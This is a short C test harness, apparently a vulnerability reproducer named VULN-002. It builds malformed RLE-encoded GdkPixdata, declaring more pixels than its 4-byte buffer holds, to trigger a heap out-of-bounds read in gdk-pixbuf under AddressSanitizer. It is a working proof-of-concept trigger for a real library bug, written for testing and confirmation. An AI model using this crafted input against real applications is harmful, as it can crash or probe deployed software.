/*
 * VULN-002 direct test harness.
 * Calls gdk_pixbuf_from_pixdata() with a 4-byte pixel_data allocation so
 * ASAN poisoning immediately follows the buffer; the OOB token read at
 * pixel_data[4] triggers heap-buffer-overflow.
 */
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <gdk-pixbuf/gdk-pixdata.h>
#include <glib.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(void) {
    /* Exactly 4 bytes: token=0x01 (raw, 1 pixel) + 3 payload bytes.
       After iteration 1 the loop has 6 output bytes still needed but
       rle_buffer is 0 bytes past the end of this allocation. */
    guint8 *pixel_data = (guint8 *)malloc(4);
    if (!pixel_data) { fprintf(stderr, "malloc failed\n"); return 1; }
    pixel_data[0] = 0x01;
    pixel_data[1] = 0xAA;
    pixel_data[2] = 0xBB;
    pixel_data[3] = 0xCC;

    GdkPixdata pixdata = {
        .magic        = GDK_PIXBUF_MAGIC_NUMBER,
        .length       = GDK_PIXDATA_HEADER_LENGTH + 4,
        .pixdata_type = GDK_PIXDATA_COLOR_TYPE_RGB |
                        GDK_PIXDATA_SAMPLE_WIDTH_8  |
                        GDK_PIXDATA_ENCODING_RLE,
        .rowstride    = 3,
        .width        = 1,
        .height       = 3,   /* needs 9 output bytes, only 4 bytes of RLE input */
        .pixel_data   = pixel_data,
    };

    fprintf(stderr, "[*] Direct harness: calling gdk_pixbuf_from_pixdata with 4-byte pixel_data\n");
    GError *error = NULL;
    GdkPixbuf *pixbuf = gdk_pixbuf_from_pixdata(&pixdata, TRUE, &error);

    if (pixbuf) {
        fprintf(stderr, "[!] Unexpectedly succeeded — %dx%d\n",
                gdk_pixbuf_get_width(pixbuf), gdk_pixbuf_get_height(pixbuf));
        g_object_unref(pixbuf);
    } else {
        fprintf(stderr, "[!] Load failed: %s\n", error ? error->message : "(no error)");
        if (error) g_error_free(error);
    }
    free(pixel_data);
    return 0;
}
